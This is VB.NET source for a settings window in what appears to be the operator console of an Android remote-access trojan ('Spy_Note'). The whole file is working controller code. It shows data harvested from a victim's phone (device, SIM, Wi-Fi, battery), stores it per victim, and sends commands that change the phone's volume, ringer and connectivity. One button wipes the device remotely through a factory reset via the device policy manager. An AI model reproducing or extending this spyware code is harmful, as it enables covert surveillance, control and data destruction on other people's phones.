Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Settings_Phone
    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim stringBuilder As StringBuilder = New StringBuilder()
                Dim separator As String() = New String() {My.Forms.Form1.s.split_Line}
                Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Me.DataGridView1.Rows.Clear()
                stringBuilder.AppendFormat("{0}", "## Phone Info ##" & vbCrLf)
                Dim array2 As String() = array(0).Split(New String() {My.Forms.Form1.s.split_Ary}, StringSplitOptions.None)
                Dim num As Integer = 0
                Dim num2 As Integer = array2.Length - 1
                For i As Integer = 0 To num2
                    Select Case num
                        Case 0
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("-1".ToUpper())), array2(i)})
                        Case 1
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("device".ToUpper())), array2(i)})
                        Case 2
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("system".ToUpper())), array2(i)})
                        Case 3
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("sim".ToUpper())), array2(i)})
                        Case 4
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("wifi".ToUpper())), array2(i)})
                        Case 5
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("battery".ToUpper())), array2(i)})
                    End Select
                    Dim flag2 As Boolean = array2(i).StartsWith("#------------") And array2(i).EndsWith("------------#")
                    If flag2 Then
                        Dim color As Color = Color.FromArgb(90, 111, 123)
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(1).Style.BackColor = color
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0).Style.BackColor = color
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0).Style.SelectionBackColor = color
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(1).Style.SelectionBackColor = color
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(1).Style.ForeColor = Color.FromArgb(245, 248, 250)
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter
                        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0).Value = Me.imageList_0.Images(Me.imageList_0.Images.IndexOfKey("-1".ToUpper()))
                        num += 1
                    End If
                    stringBuilder.AppendFormat("{0}", array2(i) + vbCrLf)
                Next
                Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Ary}
                Dim array3 As String() = array(1).Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                Me.TrackBar1.Maximum = Conversions.ToInteger(array3(0))
                Me.TrackBar1.Value = Conversions.ToInteger(array3(1))
                Me.TrackBar2.Maximum = Conversions.ToInteger(array3(2))
                Me.TrackBar2.Value = Conversions.ToInteger(array3(3))
                Me.TrackBar3.Maximum = Conversions.ToInteger(array3(4))
                Me.TrackBar3.Value = Conversions.ToInteger(array3(5))
                Me.TrackBar4.Maximum = Conversions.ToInteger(array3(6))
                Me.TrackBar4.Value = Conversions.ToInteger(array3(7))
                stringBuilder.AppendFormat("{0}", "## Votes and alerts ##" & vbCrLf & "Ringtone" & vbCrLf + array3(1) + "of" + array3(0))
                stringBuilder.AppendFormat("{0}", vbCrLf & "Media" & vbCrLf + array3(3) + "of" + array3(2))
                stringBuilder.AppendFormat("{0}", vbCrLf & "Notification" & vbCrLf + array3(5) + "of" + array3(4))
                stringBuilder.AppendFormat("{0}", vbCrLf & "System" & vbCrLf + array3(7) + "of" + array3(6))
                Dim separator3 As String() = New String() {My.Forms.Form1.s.split_Ary}
                Dim array4 As String() = array(2).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                Me.Label1.Text = array4(0)
                Me.Label2.Text = array4(1)
                Me.Label3.Text = array4(2)
                Me.Label4.Text = array4(3)
                Me.Label5.Text = array4(4)
                Me.Label6.Text = array4(5)
                Me.Label7.Text = array4(6)
                Me.Label8.Text = array4(7)
                Me.refvalues()
                stringBuilder.AppendFormat("{0}", vbCrLf & "## Phone bar ##" & vbCrLf & "normal=" + array4(0) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "vibrate=" + array4(1) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "silent=" + array4(2) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "bluetooth=" + array4(3) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "gps=" + array4(4) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "mobile_data=" + array4(5) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "wifi_connected=" + array4(6) + vbCrLf)
                stringBuilder.AppendFormat("{0}", "wifi_disconnected=" + array4(7) + vbCrLf)
                Dim array5 As String() = New String() {My.Forms.Form1.s.split_Ary}
                Dim array6 As String() = array(3).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                Dim text As String = array6(0)
                Me.Label11.Text = text
                Dim flag3 As Boolean = Operators.CompareString(text, "-1", False) = 0 Or Operators.CompareString(text, "False", False) = 0
                If flag3 Then
                    Me.Panel4.Enabled = False
                Else
                    Me.Panel4.Enabled = True
                End If
                stringBuilder.AppendFormat("{0}", "## Device Policy Manager ##" & vbCrLf + text + vbCrLf)
                store_0.Save_0(Me.Name_Client + Me.Client_ID + "\Settings", stringBuilder.ToString())
                Me.DataGridView1.ClearSelection()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Settings_Phone_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Me.CopyToolStripMenuItem.Image = store_0.Bitmap_0("ctx_copy")
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\icons\phone_info\")
        For Each text As String In files
            Dim flag2 As Boolean = Not flag
            If flag2 Then
                Me.icon_0.Width = Image.FromFile(text).Size.Width
                Me.imageList_0.ImageSize = New Size(Image.FromFile(text).Size.Width, Image.FromFile(text).Size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim path As String = text
            Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text))
        Next
        MyBase.Icon = store_0.icons_0("window")
        Me.Button2.Image = store_0.Bitmap_0("normal")
        Me.Button3.Image = store_0.Bitmap_0("vibrate")
        Me.Button4.Image = store_0.Bitmap_0("silent")
        Me.Button5.Image = store_0.Bitmap_0("bluetooth")
        Me.Button6.Image = store_0.Bitmap_0("gps")
        Me.Button7.Image = store_0.Bitmap_0("mobile_data")
        Me.Button8.Image = store_0.Bitmap_0("wifi_connected")
        Me.Button9.Image = store_0.Bitmap_0("wifi_disconnected")
        Dim text2 As String = String.Format(Me.Text + " - Remote Address & Port: {0} Client Name: {1}", Me.Client_remote_Address, Me.Name_Client)
        Me.Text = text2
        Me.TabPage1.Text = "Phone Info"
        Me.TabPage2.Text = "Votes and alerts"
        Me.TabPage3.Text = "Phone bar"
        Me.TabPage4.Text = "Device Policy Manager"
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "settings_phone" + My.Forms.Form1.s.SplitData)
    End Sub

    Private Sub refvalues()
        Me.GroupBox1.Text = String.Concat(New String() {"Ringtone(", Conversions.ToString(Me.TrackBar1.Value), " of ", Conversions.ToString(Me.TrackBar1.Maximum), ")"})
        Me.GroupBox2.Text = String.Concat(New String() {"Media(", Conversions.ToString(Me.TrackBar2.Value), " of ", Conversions.ToString(Me.TrackBar2.Maximum), ")"})
        Me.GroupBox3.Text = String.Concat(New String() {"Notification(", Conversions.ToString(Me.TrackBar3.Value), " of ", Conversions.ToString(Me.TrackBar3.Maximum), ")"})
        Me.GroupBox4.Text = String.Concat(New String() {"System(", Conversions.ToString(Me.TrackBar4.Value), " of ", Conversions.ToString(Me.TrackBar4.Maximum), ")"})
    End Sub

    Private Sub TrackBar1_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar1.MouseUp
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sound_control", My.Forms.Form1.s.SplitData, "0", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.TrackBar1.Value)}))
    End Sub

    Private Sub TrackBar2_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar2.MouseUp
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sound_control", My.Forms.Form1.s.SplitData, "1", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.TrackBar2.Value)}))
    End Sub

    Private Sub TrackBar3_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar3.MouseUp
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sound_control", My.Forms.Form1.s.SplitData, "2", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.TrackBar3.Value)}))
    End Sub

    Private Sub TrackBar4_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBar4.MouseUp
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sound_control", My.Forms.Form1.s.SplitData, "3", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.TrackBar4.Value)}))
    End Sub

    Private Sub TrackBar1_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar1.KeyDown
        e.Handled = True
    End Sub

    Private Sub TrackBar2_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar2.KeyDown
        e.Handled = True
    End Sub

    Private Sub TrackBar3_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar3.KeyDown
        e.Handled = True
    End Sub

    Private Sub TrackBar4_KeyDown(sender As Object, e As KeyEventArgs) Handles TrackBar4.KeyDown
        e.Handled = True
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        Me.refvalues()
    End Sub

    Private Sub TrackBar2_Scroll(sender As Object, e As EventArgs) Handles TrackBar2.Scroll
        Me.refvalues()
    End Sub

    Private Sub TrackBar3_Scroll(sender As Object, e As EventArgs) Handles TrackBar3.Scroll
        Me.refvalues()
    End Sub

    Private Sub TrackBar4_Scroll(sender As Object, e As EventArgs) Handles TrackBar4.Scroll
        Me.refvalues()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "bar_control" + My.Forms.Form1.s.SplitData + "0")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "bar_control" + My.Forms.Form1.s.SplitData + "1")
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "bar_control" + My.Forms.Form1.s.SplitData + "2")
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "bar_control" + My.Forms.Form1.s.SplitData + "3")
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "bar_control" + My.Forms.Form1.s.SplitData + "4")
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "device_policy_manager" + My.Forms.Form1.s.SplitData + "1")
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Dim flag As Boolean = MessageBox.Show("Factory will be reset" & vbCrLf & "Are you sure the ?", store_0.name_prog, MessageBoxButtons.YesNo) = DialogResult.Yes
        If flag Then
            My.Forms.Form1.s.Send(Me.handle_Number_Client, "device_policy_manager" + My.Forms.Form1.s.SplitData + "0")
        End If
    End Sub
    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Dim stringBuilder As StringBuilder = New StringBuilder()
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Dim str As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                stringBuilder.Append(str + vbCrLf)
            Next
            Dim flag2 As Boolean = Operators.CompareString(stringBuilder.ToString(), Nothing, False) <> 0
            If flag2 Then
                Try
                    My.Computer.Clipboard.SetText(stringBuilder.ToString().Trim())
                Catch ex As Exception
                End Try
            End If
        End If
    End Sub
End Class